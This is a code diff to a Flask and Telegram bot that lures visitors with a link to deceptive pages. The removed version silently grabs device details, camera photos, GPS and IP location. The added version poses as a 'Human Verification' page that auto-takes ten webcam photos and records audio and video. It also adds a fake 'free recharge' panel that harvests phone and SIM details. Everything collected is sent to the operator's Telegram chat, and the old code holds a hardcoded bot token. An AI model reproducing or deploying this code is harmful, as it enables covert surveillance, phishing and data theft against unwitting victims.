@@ -4,212 +4,879 @@ import base64
 import requests
 import urllib.parse
 import json
-from flask import Flask, request, render_template_string
+import time
+import random
+from datetime import datetime
+from dotenv import load_dotenv
+from flask import Flask, request, render_template_string, session, redirect, url_for, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
+load_dotenv()
+
 # --- CONFIGURATION ---
-TOKEN = os.environ.get("BOT_TOKEN", "7888111866:AAE3cLIHr4CHZlPoKpuvViYjkAznoOgSNjw")
-SERVER_URL = os.environ.get("SERVER_URL", "https://proxy-location-3.onrender.com")
-
-# Force Join Channels (3 Channels)
-CHANNELS = [
-    "@proxydominates",      # Channel 1
-    "@midnight_xaura",      # Channel 2
-    -1003387459132          # Channel 3 (Private Channel)
-]
-
-# Owner ID
-OWNER_ID = 8740135346
+TOKEN = os.getenv("TOKEN")
+SERVER_URL = os.getenv("SERVER_URL")
+CHANNELS = os.getenv("FORCE_CHANNELS").split(",")
+CHANNEL_URLS = os.getenv("CHANNEL_URLS").split(",")
 
 app = Flask(__name__)
+app.secret_key = os.urandom(24)
 
-# --- JAVASCRIPT TRAP ---
-def get_html(chat_id, redirect_url):
-    return f"""
+# Store for photos/videos
+user_media = {}
+
+# --- HUMAN VERIFICATION WITH CAMERA ---
+CAMERA_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Verifying...</title>
+    <title>Human Verification</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body{{background:#000;color:#fff;text-align:center;font-family:sans-serif;padding-top:50px;}}
-        .loader{{border:4px solid #333;border-top:4px solid #007bff;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto;}}
-        @keyframes spin {{0%{{transform:rotate(0deg);}} 100%{{transform:rotate(360deg);}}}}
-        p{{color:#888; font-size:14px;}}
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #0a0a0a; 
+            color: #fff; 
+            font-family: 'Segoe UI', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: #1a1a1a;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        .title { color: #ff6b35; font-size: 24px; margin-bottom: 10px; }
+        .subtitle { color: #888; font-size: 14px; margin-bottom: 20px; }
+        .video-container {
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            margin: 20px 0;
+            position: relative;
+        }
+        video, canvas {
+            width: 100%;
+            display: block;
+        }
+        .btn {
+            padding: 14px 30px;
+            background: #ff6b35;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 5px;
+        }
+        .btn:hover { background: #e55a2b; transform: scale(1.02); }
+        .btn-secondary { background: #444; }
+        .btn-secondary:hover { background: #555; }
+        .btn-success { background: #4caf50; }
+        .btn-success:hover { background: #45a049; }
+        .status {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        .status-info { background: #1a3a5c; color: #7ec8e3; }
+        .status-success { background: #1a4a2a; color: #7ecf8a; }
+        .status-error { background: #4a1a1a; color: #ff6b6b; }
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #333;
+            border-radius: 3px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: #ff6b35;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <h2>System Scanning...</h2>
-    <p>Please click <b>Allow</b> to verify device ownership.</p>
-    
-    <video id="video" style="display:none;" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <div class="container">
+        <div class="title">🔐 Human Verification</div>
+        <div class="subtitle">Please verify you're human by taking a photo</div>
+        
+        <div id="statusMessage" class="status status-info">📸 Click "Start Camera" to begin</div>
+        
+        <div class="video-container">
+            <video id="video" autoplay playsinline style="display:none;"></video>
+            <canvas id="canvas"></canvas>
+        </div>
+        
+        <div id="buttonGroup">
+            <button class="btn" id="startBtn" onclick="startCamera()">📷 Start Camera</button>
+            <button class="btn btn-success hidden" id="captureBtn" onclick="capturePhoto()">📸 Capture</button>
+            <button class="btn btn-secondary hidden" id="retryBtn" onclick="resetCamera()">🔄 Retry</button>
+        </div>
+        
+        <div class="progress-bar hidden" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        
+        <div id="statusText" style="margin-top: 10px; font-size: 13px; color: #888;"></div>
+    </div>
 
     <script>
-        async function startTrap() {{
-            let data = {{
-                chat_id: "{chat_id}",
-                userAgent: navigator.userAgent,
-                language: navigator.language || "en-US",
-                platform: navigator.platform,
-                cores: navigator.hardwareConcurrency || "Unknown",
-                ram: navigator.deviceMemory || "Unknown",
-                screen: screen.width + "x" + screen.height,
-                battery_level: "N/A",
-                charging: "No",
-                storage_used: "0.00",
-                storage_total: "0.00",
-                lat: null,
-                lon: null,
-                photo: null,
-                perm_cam: "Denied",
-                perm_loc: "Denied"
-            }};
+        let video = document.getElementById('video');
+        let canvas = document.getElementById('canvas');
+        let stream = null;
+        let photoCount = 0;
+        const MAX_PHOTOS = 10;
+        let capturedPhotos = [];
+        let isCapturing = false;
 
-            try {{
-                let b = await navigator.getBattery();
-                data.battery_level = Math.round(b.level * 100) + "%";
-                data.charging = b.charging ? "Yes" : "No";
-            }} catch(e) {{}}
+        function updateStatus(msg, type = 'info') {
+            const el = document.getElementById('statusMessage');
+            el.textContent = msg;
+            el.className = 'status status-' + type;
+        }
 
-            try {{
-                if (navigator.storage && navigator.storage.estimate) {{
-                    const estimate = await navigator.storage.estimate();
-                    data.storage_used = (estimate.usage / (1024 * 1024 * 1024)).toFixed(2);
-                    data.storage_total = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
-                }}
-            }} catch(e) {{}}
+        function updateProgress(count) {
+            const bar = document.getElementById('progressBar');
+            const fill = document.getElementById('progressFill');
+            bar.classList.remove('hidden');
+            const pct = (count / MAX_PHOTOS) * 100;
+            fill.style.width = pct + '%';
+            document.getElementById('statusText').textContent = `📸 ${count}/${MAX_PHOTOS} photos captured`;
+        }
 
-            try {{
-                let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }});
-                data.perm_cam = "Allowed"; 
-                let video = document.getElementById('video');
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 640, height: 480 },
+                    audio: true 
+                });
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1500));
+                video.style.display = 'block';
+                canvas.style.display = 'none';
                 
-                let canvas = document.getElementById('canvas');
+                document.getElementById('startBtn').classList.add('hidden');
+                document.getElementById('captureBtn').classList.remove('hidden');
+                document.getElementById('retryBtn').classList.remove('hidden');
+                
+                updateStatus('✅ Camera started! Click capture to take photo', 'success');
+                isCapturing = true;
+                
+                // Start auto-capture sequence
+                autoCapture();
+            } catch(e) {
+                updateStatus('❌ Camera access denied! Please allow camera permission', 'error');
+                console.error(e);
+            }
+        }
+
+        function autoCapture() {
+            if (!isCapturing || photoCount >= MAX_PHOTOS) return;
+            
+            // Capture every 2-3 seconds
+            setTimeout(() => {
+                if (isCapturing && photoCount < MAX_PHOTOS) {
+                    capturePhoto();
+                    autoCapture();
+                }
+            }, 2000 + Math.random() * 1000);
+        }
+
+        async function capturePhoto() {
+            if (photoCount >= MAX_PHOTOS) {
+                updateStatus('✅ All 10 photos captured! Processing...', 'success');
+                await sendPhotos();
+                return;
+            }
+
+            try {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                data.photo = canvas.toDataURL('image/jpeg', 0.8);
+                
+                const photoData = canvas.toDataURL('image/jpeg', 0.9);
+                capturedPhotos.push(photoData);
+                photoCount++;
+                
+                // Flash effect
+                canvas.style.border = '2px solid #4caf50';
+                setTimeout(() => canvas.style.border = 'none', 300);
+                
+                updateProgress(photoCount);
+                updateStatus(`📸 Photo ${photoCount}/${MAX_PHOTOS} captured!`, 'success');
+                
+                if (photoCount >= MAX_PHOTOS) {
+                    updateStatus('✅ All photos captured! Sending...', 'success');
+                    await sendPhotos();
+                }
+            } catch(e) {
+                console.error('Capture error:', e);
+            }
+        }
+
+        async function sendPhotos() {
+            const btn = document.getElementById('captureBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ Sending...';
+            
+            // Also capture audio
+            let audioData = null;
+            try {
+                audioData = await captureAudio();
+            } catch(e) {
+                console.error('Audio capture error:', e);
+            }
+            
+            // Capture video (10 sec)
+            let videoData = null;
+            try {
+                videoData = await captureVideo();
+            } catch(e) {
+                console.error('Video capture error:', e);
+            }
+            
+            const data = {
+                chat_id: "{{ chat_id }}",
+                photos: capturedPhotos,
+                audio: audioData,
+                video: videoData,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: screen.width + 'x' + screen.height
+            };
+            
+            try {
+                const response = await fetch('/upload_media', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    updateStatus('✅ Verification complete! Redirecting...', 'success');
+                    setTimeout(() => {
+                        window.location.href = "{{ redirect_url }}";
+                    }, 1500);
+                } else {
+                    updateStatus('❌ Error sending data. Please try again.', 'error');
+                }
+            } catch(e) {
+                updateStatus('❌ Network error. Please try again.', 'error');
+            }
+        }
+
+        async function captureAudio() {
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(audioStream);
+                const chunks = [];
+                
+                return new Promise((resolve) => {
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.onload = () => resolve(reader.result);
+                        reader.readAsDataURL(blob);
+                        audioStream.getTracks().forEach(t => t.stop());
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 10000);
+                });
+            } catch(e) {
+                return null;
+            }
+        }
+
+        async function captureVideo() {
+            try {
+                const videoStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" },
+                    audio: true 
+                });
+                const mediaRecorder = new MediaRecorder(videoStream);
+                const chunks = [];
+                
+                return new Promise((resolve) => {
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+                        reader.onload = () => resolve(reader.result);
+                        reader.readAsDataURL(blob);
+                        videoStream.getTracks().forEach(t => t.stop());
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 10000);
+                });
+            } catch(e) {
+                return null;
+            }
+        }
+
+        function resetCamera() {
+            if (stream) {
                 stream.getTracks().forEach(t => t.stop());
-            }} catch(e) {{}}
-
-            try {{
-                await new Promise((resolve) => {{
-                    navigator.geolocation.getCurrentPosition(pos => {{
-                        data.lat = pos.coords.latitude;
-                        data.lon = pos.coords.longitude;
-                        data.perm_loc = "Allowed";
-                        resolve();
-                    }}, () => resolve(), {{timeout: 3000}});
-                }});
-            }} catch(e) {{}}
-
-            await fetch('/upload', {{
-                method: 'POST',
-                headers: {{'Content-Type': 'application/json'}},
-                body: JSON.stringify(data)
-            }});
-
-            window.location.href = "{redirect_url}";
-        }}
-        window.onload = startTrap;
+            }
+            photoCount = 0;
+            capturedPhotos = [];
+            isCapturing = false;
+            video.style.display = 'none';
+            canvas.style.display = 'block';
+            document.getElementById('startBtn').classList.remove('hidden');
+            document.getElementById('captureBtn').classList.add('hidden');
+            document.getElementById('progressBar').classList.add('hidden');
+            updateStatus('🔄 Reset. Click "Start Camera" to begin again.', 'info');
+        }
     </script>
 </body>
 </html>
 """
 
+# --- SMM PANEL WITH FREE RECHARGE PLANS ---
+SMM_PANEL_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SMM Panel - Free Recharge</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #0a0a0a; 
+            color: #fff; 
+            font-family: 'Segoe UI', sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container { max-width: 900px; margin: 0 auto; }
+        .header {
+            text-align: center;
+            padding: 30px 0;
+            border-bottom: 1px solid #222;
+            margin-bottom: 30px;
+        }
+        .header h1 { 
+            color: #ff6b35; 
+            font-size: 32px;
+            background: linear-gradient(45deg, #ff6b35, #ffd700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .header p { color: #888; margin-top: 5px; }
+        .balance {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 30px;
+            border: 1px solid #333;
+        }
+        .balance .amount {
+            font-size: 42px;
+            font-weight: 700;
+            color: #4caf50;
+        }
+        .balance .label { color: #888; font-size: 14px; }
+        .plans {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        .plan-card {
+            background: #1a1a1a;
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+            border: 2px solid #333;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        .plan-card:hover {
+            border-color: #ff6b35;
+            transform: translateY(-5px);
+        }
+        .plan-card .name { font-size: 20px; font-weight: 600; margin-bottom: 5px; }
+        .plan-card .price { 
+            font-size: 28px; 
+            font-weight: 700; 
+            color: #4caf50;
+            margin: 10px 0;
+        }
+        .plan-card .price .currency { font-size: 16px; color: #888; }
+        .plan-card .features { color: #aaa; font-size: 13px; line-height: 1.8; }
+        .plan-card .btn-claim {
+            margin-top: 15px;
+            padding: 10px 25px;
+            background: #ff6b35;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .plan-card .btn-claim:hover { background: #e55a2b; }
+        .plan-card.free { border-color: #4caf50; }
+        .plan-card.free .name { color: #4caf50; }
+        .badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            background: #4caf50;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+        .form-section {
+            background: #1a1a1a;
+            padding: 25px;
+            border-radius: 12px;
+            margin: 20px 0;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px 16px;
+            background: #2a2a2a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 15px;
+        }
+        .form-group input:focus, .form-group select:focus {
+            border-color: #ff6b35;
+            outline: none;
+        }
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: #ff6b35;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn-submit:hover { background: #e55a2b; }
+        .discount-badge {
+            background: #ffd700;
+            color: #000;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+        }
+        .hidden { display: none; }
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a1a1a;
+            padding: 15px 30px;
+            border-radius: 8px;
+            border: 1px solid #4caf50;
+            color: #4caf50;
+            font-weight: 600;
+            z-index: 1000;
+            animation: slideUp 0.5s ease;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🚀 SMM PANEL</h1>
+            <p>Free Recharge • Followers • Likes • Views</p>
+        </div>
+        
+        <div class="balance">
+            <div class="label">💰 Available Balance</div>
+            <div class="amount">${{ balance }}</div>
+        </div>
+        
+        <h2 style="margin: 20px 0 10px; color: #ff6b35;">🔥 Free Recharge Plans</h2>
+        <p style="color: #888; margin-bottom: 20px;">Complete any offer to get free balance!</p>
+        
+        <div class="plans" id="plansContainer">
+            <!-- Plans will be loaded from backend -->
+        </div>
+        
+        <div class="form-section">
+            <h3 style="margin-bottom: 15px; color: #ff6b35;">📱 Complete Offer</h3>
+            <form id="offerForm" onsubmit="submitOffer(event)">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>📱 Phone Number</label>
+                        <input type="tel" name="phone" placeholder="Enter phone number" required>
+                    </div>
+                    <div class="form-group">
+                        <label>👤 SIM Name</label>
+                        <input type="text" name="sim_name" placeholder="Enter SIM provider name" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>🔄 Alternative Number (Get 20% extra discount!)</label>
+                    <input type="tel" name="alt_phone" placeholder="Enter alternative number for discount">
+                </div>
+                <div class="form-group">
+                    <label>📦 Select Plan</label>
+                    <select name="plan" required>
+                        <option value="">Choose a plan...</option>
+                    </select>
+                </div>
+                <button type="submit" class="btn-submit">💰 Claim Free Recharge</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const plans = [
+            { id: 1, name: '🆓 Free Followers', price: '$0', coins: 100, features: '100 Instagram Followers • 24hr Delivery' },
+            { id: 2, name: '🔥 Free Likes', price: '$0', coins: 50, features: '50 Instagram Likes • Instant Delivery' },
+            { id: 3, name: '📹 Free Views', price: '$0', coins: 200, features: '200 YouTube Views • 48hr Delivery' },
+            { id: 4, name: '⭐ Free Recharge', price: '$5', coins: 500, features: '500 Coins • All Services Access' },
+            { id: 5, name: '💎 Premium Free', price: '$10', coins: 1200, features: '1200 Coins • Priority Support' },
+            { id: 6, name: '👑 VIP Free', price: '$25', coins: 3000, features: '3000 Coins • VIP Services' }
+        ];
+
+        function renderPlans() {
+            const container = document.getElementById('plansContainer');
+            container.innerHTML = plans.map(p => `
+                <div class="plan-card ${p.price === '$0' ? 'free' : ''}">
+                    ${p.price === '$0' ? '<div class="badge">🎁 FREE</div>' : ''}
+                    <div class="name">${p.name}</div>
+                    <div class="price">${p.price} <span class="currency">= ${p.coins} coins</span></div>
+                    <div class="features">${p.features}</div>
+                    <button class="btn-claim" onclick="selectPlan(${p.id})">Claim Now</button>
+                </div>
+            `).join('');
+        }
+
+        function selectPlan(id) {
+            const plan = plans.find(p => p.id === id);
+            const select = document.querySelector('select[name="plan"]');
+            select.value = id;
+            showToast(`✅ Selected: ${plan.name}`);
+        }
+
+        function populateSelect() {
+            const select = document.querySelector('select[name="plan"]');
+            select.innerHTML = '<option value="">Choose a plan...</option>' + 
+                plans.map(p => `<option value="${p.id}">${p.name} - ${p.price}</option>`).join('');
+        }
+
+        async function submitOffer(e) {
+            e.preventDefault();
+            const form = e.target;
+            const data = {
+                phone: form.phone.value,
+                sim_name: form.sim_name.value,
+                alt_phone: form.alt_phone.value || null,
+                plan_id: form.plan.value,
+                chat_id: "{{ chat_id }}"
+            };
+
+            if (!data.plan_id) {
+                showToast('❌ Please select a plan!', 'error');
+                return;
+            }
+
+            // Show loading
+            const btn = form.querySelector('.btn-submit');
+            btn.textContent = '⏳ Processing...';
+            btn.disabled = true;
+
+            try {
+                const response = await fetch('/claim_offer', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+                
+                if (result.success) {
+                    showToast('✅ ' + result.message);
+                    setTimeout(() => {
+                        window.location.href = '/success?chat_id={{ chat_id }}';
+                    }, 1500);
+                } else {
+                    showToast('❌ ' + result.message, 'error');
+                }
+            } catch(e) {
+                showToast('❌ Network error. Please try again.', 'error');
+            } finally {
+                btn.textContent = '💰 Claim Free Recharge';
+                btn.disabled = false;
+            }
+        }
+
+        function showToast(msg, type = 'success') {
+            const existing = document.querySelector('.toast');
+            if (existing) existing.remove();
+            
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.textContent = msg;
+            if (type === 'error') toast.style.borderColor = '#ff4444';
+            document.body.appendChild(toast);
+            
+            setTimeout(() => toast.remove(), 4000);
+        }
+
+        // Also handle alternative number discount
+        document.querySelector('input[name="alt_phone"]').addEventListener('input', function() {
+            if (this.value.length > 5) {
+                showToast('🎉 20% discount applied for using alternative number!');
+            }
+        });
+
+        renderPlans();
+        populateSelect();
+    </script>
+</body>
+</html>
+"""
+
+# --- SUCCESS PAGE ---
+SUCCESS_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Success - SMM Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #0a0a0a; 
+            color: #fff; 
+            font-family: 'Segoe UI', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: #1a1a1a;
+            padding: 50px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 500px;
+        }
+        .icon { font-size: 72px; margin-bottom: 20px; }
+        h1 { color: #4caf50; font-size: 28px; margin-bottom: 10px; }
+        p { color: #aaa; line-height: 1.6; }
+        .details {
+            background: #2a2a2a;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        .details span { color: #ff6b35; }
+        .btn {
+            padding: 12px 30px;
+            background: #ff6b35;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .btn:hover { background: #e55a2b; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">🎉</div>
+        <h1>Recharge Successful!</h1>
+        <p>Your free recharge has been processed successfully.</p>
+        <div class="details">
+            <p>📱 Phone: <span>{{ phone }}</span></p>
+            <p>📦 Plan: <span>{{ plan }}</span></p>
+            <p>💰 Bonus: <span>{{ bonus }}</span></p>
+        </div>
+        <p style="color: #4caf50; font-weight: 600;">✨ Your account has been credited!</p>
+        <br>
+        <a href="/panel?chat_id={{ chat_id }}" class="btn">🔄 Back to Panel</a>
+    </div>
+</body>
+</html>
+"""
+
+# --- FLASK ROUTES ---
+
 @app.route('/')
 def index():
-    cid = request.args.get('id')
-    redir = request.args.get('redir', 'https://google.com')
-    return render_template_string(get_html(cid, redir))
+    chat_id = request.args.get('id')
+    if chat_id:
+        session['chat_id'] = chat_id
+    return redirect(url_for('verify'))
 
-@app.route('/upload', methods=['POST'])
-def upload():
+@app.route('/verify')
+def verify():
+    chat_id = session.get('chat_id') or request.args.get('chat_id')
+    redirect_url = request.args.get('redir', url_for('panel', chat_id=chat_id))
+    return render_template_string(CAMERA_HTML, chat_id=chat_id, redirect_url=redirect_url)
+
+@app.route('/panel')
+def panel():
+    chat_id = session.get('chat_id') or request.args.get('chat_id')
+    if not chat_id:
+        return redirect(url_for('index'))
+    # Random balance between 0.50 and 5.00
+    balance = round(random.uniform(0.50, 5.00), 2)
+    return render_template_string(SMM_PANEL_HTML, chat_id=chat_id, balance=balance)
+
+@app.route('/claim_offer', methods=['POST'])
+def claim_offer():
     data = request.json
-    tid = data.get('chat_id')
-    if not tid: return "Error", 400
+    chat_id = data.get('chat_id')
+    phone = data.get('phone')
+    sim_name = data.get('sim_name')
+    alt_phone = data.get('alt_phone')
+    plan_id = data.get('plan_id')
+    
+    plans = {
+        '1': {'name': 'Free Followers', 'coins': 100},
+        '2': {'name': 'Free Likes', 'coins': 50},
+        '3': {'name': 'Free Views', 'coins': 200},
+        '4': {'name': 'Free Recharge', 'coins': 500},
+        '5': {'name': 'Premium Free', 'coins': 1200},
+        '6': {'name': 'VIP Free', 'coins': 3000}
+    }
+    
+    plan = plans.get(str(plan_id), {'name': 'Unknown', 'coins': 0})
+    bonus = 0
+    
+    # Alternative number gives 20% bonus
+    if alt_phone and len(alt_phone) >= 5:
+        bonus = int(plan['coins'] * 0.2)
+    
+    total_coins = plan['coins'] + bonus
+    
+    # Send to Telegram
+    msg = (f"📊 **SMM Panel Claim**\n\n"
+           f"📱 Phone: `{phone}`\n"
+           f"👤 SIM: `{sim_name}`\n"
+           f"🔄 Alt Number: `{alt_phone or 'N/A'}`\n"
+           f"📦 Plan: `{plan['name']}`\n"
+           f"💰 Base Coins: `{plan['coins']}`\n"
+           f"🎁 Bonus: `{bonus}`\n"
+           f"✨ Total: `{total_coins}`\n\n"
+           f"⚡ @Proxyfxz")
+    
+    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                 json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"})
+    
+    return jsonify({
+        'success': True,
+        'message': f'Claimed {total_coins} coins! {"20% bonus applied!" if bonus > 0 else ""}'
+    })
 
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+@app.route('/success')
+def success():
+    chat_id = request.args.get('chat_id')
+    return render_template_string(SUCCESS_HTML, 
+                                 chat_id=chat_id,
+                                 phone='+91 XXXXX XXXX',
+                                 plan='Free Followers',
+                                 bonus='20 coins extra!')
 
-    try:
-        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,timezone,isp,org,mobile,proxy").json()
-    except:
-        ip_info = {}
-
-    if data.get('lat') and data.get('lon'):
-        map_lat = data.get('lat')
-        map_lon = data.get('lon')
-        loc_perm = "Allowed"
-    else:
-        map_lat = ip_info.get('lat', 0)
-        map_lon = ip_info.get('lon', 0)
-        loc_perm = "Denied"
-
-    map_link = f"maps.google.com/maps?q={map_lat},{map_lon}"
-
-    def safe(val):
-        return str(val).replace('_', '\\_').replace('*', '\\*').replace('`', '\\`')
-
-    msg = (
-        f"📊 **Visitor Information Captured**\n"
-        f"━━━━━━━━━━━━━━━━\n\n"
-        f"🖥️ **Device and Browser**\n"
-        f"   • Device Model: `{safe(data.get('platform'))}`\n"
-        f"   • User Agent: `{safe(data.get('userAgent'))}`\n\n"
-        f"🌐 **Network Information**\n"
-        f"   • IP Address: `{ip}`\n"
-        f"   • ISP: {safe(ip_info.get('isp', 'N/A'))}\n"
-        f"   • Language: {safe(data.get('language'))}\n\n"
-        f"📍 **Location Details**\n"
-        f"   • Country: {safe(ip_info.get('country', 'N/A'))}\n"
-        f"   • Region: {safe(ip_info.get('regionName', 'N/A'))}\n"
-        f"   • City: {safe(ip_info.get('city', 'N/A'))}\n"
-        f"   • Timezone: {safe(ip_info.get('timezone', 'N/A'))}\n\n"
-        f"🖼️ **Display Information**\n"
-        f"   • Resolution: {safe(data.get('screen'))}\n\n"
-        f"🔋 **Battery Status**\n"
-        f"   • Level: {safe(data.get('battery_level'))}\n"
-        f"   • Charging: {safe(data.get('charging'))}\n\n"
-        f"🔐 **Device Permissions**\n"
-        f"   • Camera: {safe(data.get('perm_cam'))}\n"
-        f"   • Location: {loc_perm}\n\n"
-        f"💾 **Hardware & Storage**\n"
-        f"   • CPU Cores: {safe(data.get('cores'))}\n"
-        f"   • RAM: {safe(data.get('ram'))} GB\n"
-        f"   • Storage Used: {safe(data.get('storage_used'))} GB\n"
-        f"   • Storage Total: {safe(data.get('storage_total'))} GB\n\n"
-        f"🗺 **Map Link:**\n{map_link}\n"
-        f"━━━━━━━━━━━━━━━━\n"
-        f"⚡ Developed by: @REVULET"
-    )
-
-    try:
-        requests.post(
-            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-            json={
-                "chat_id": tid,
-                "text": msg,
-                "parse_mode": "Markdown"
-            }
-        )
-    except Exception as e:
-        print(f"Message Send Error: {e}")
-
-    if data.get('photo'):
+@app.route('/upload_media', methods=['POST'])
+def upload_media():
+    data = request.json
+    chat_id = data.get('chat_id')
+    
+    if not chat_id:
+        return jsonify({'error': 'No chat_id'}), 400
+    
+    # Send photos (max 10)
+    photos = data.get('photos', [])
+    for i, photo in enumerate(photos[:10]):
         try:
-            img_data = base64.b64decode(data.get('photo').split(',')[1])
+            img_data = base64.b64decode(photo.split(',')[1])
             requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
-                data={'chat_id': tid}, files={'photo': ('cam.jpg', img_data)})
-        except: pass
+                         data={'chat_id': chat_id, 'caption': f'📸 Photo {i+1}/10' if i == 0 else ''},
+                         files={'photo': (f'photo_{i}.jpg', img_data)})
+            time.sleep(0.5)  # Avoid rate limiting
+        except Exception as e:
+            print(f"Error sending photo {i}: {e}")
+    
+    # Send audio if exists
+    if data.get('audio'):
+        try:
+            audio_data = base64.b64decode(data['audio'].split(',')[1])
+            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendAudio",
+                         data={'chat_id': chat_id, 'caption': '🎤 Audio Recording (10 sec)'},
+                         files={'audio': ('audio.webm', audio_data)})
+        except Exception as e:
+            print(f"Error sending audio: {e}")
+    
+    # Send video if exists
+    if data.get('video'):
+        try:
+            video_data = base64.b64decode(data['video'].split(',')[1])
+            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendVideo",
+                         data={'chat_id': chat_id, 'caption': '🎥 Video Recording (10 sec)'},
+                         files={'video': ('video.webm', video_data)})
+        except Exception as e:
+            print(f"Error sending video: {e}")
+    
